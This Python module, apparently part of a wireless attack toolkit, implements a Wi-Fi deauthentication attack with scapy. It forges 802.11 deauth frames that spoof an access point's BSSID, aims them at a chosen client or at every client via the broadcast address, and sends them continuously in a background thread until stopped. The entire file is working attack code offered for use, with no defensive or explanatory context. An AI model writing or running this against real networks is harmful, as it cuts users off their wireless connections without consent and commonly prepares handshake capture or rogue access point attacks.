# core/modules/attack_modules/deauth_attack.py

from scapy.all import *
import threading
from typing import List

from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth


class DeauthAttack:
    def __init__(self, interface: str, target_bssid: str, target_client: str = None, stop_event: threading.Event = None):
        """
        Initializes the DeauthAttack.

        Args:
            interface (str): The network interface to send deauth packets on.
            target_bssid (str): The BSSID of the target access point.
            target_client (str, optional): The MAC address of the target client. If None, broadcast to all clients.
            stop_event (threading.Event, optional): Event to signal stopping the attack.
        """
        self.interface = interface
        self.target_bssid = target_bssid
        self.target_client = target_client
        self.stop_event = stop_event or threading.Event()

    def send_deauth_packets(self):
        """
        Sends deauthentication packets in a loop until stopped.
        """
        while not self.stop_event.is_set():
            pkt = RadioTap()/Dot11(addr1=self.target_client if self.target_client else 'ff:ff:ff:ff:ff:ff',
                                   addr2=self.target_bssid,
                                   addr3=self.target_bssid)/Dot11Deauth(reason=7)
            sendp(pkt, iface=self.interface, verbose=0)
            time.sleep(0.1)  # Adjust the rate as needed

    def start_attack(self):
        """
        Starts the deauthentication attack in a separate thread.
        """
        attack_thread = threading.Thread(target=self.send_deauth_packets, daemon=True)
        attack_thread.start()

    def stop_attack(self):
        """
        Signals the attack to stop.
        """
        self.stop_event.set()
